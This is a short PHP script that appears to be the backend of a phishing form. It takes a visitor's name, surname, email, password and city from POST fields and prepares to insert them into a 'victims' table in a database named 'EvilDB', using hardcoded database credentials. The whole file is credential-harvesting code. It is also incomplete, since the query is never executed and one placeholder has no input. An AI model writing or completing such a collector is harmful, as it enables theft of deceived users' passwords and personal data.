<?php
$nome = $_POST['nome'];
$sobrenome = $_POST['sobrenome'];
$mail = $_POST['mail'];
$senha = $_POST['pass'];
$cidade = $_POST['city'];

$con = new PDO(
	"mysql:host=localhost;dbname=EvilDB",
	"Tennebris",
	"password"
);

$query = $con->prepare("INSERT INTO victims(nome,sobre,image,email,senha,cidade) VALUES(:nome, :sobre, :image,:email,:senha,:cidade)");

?>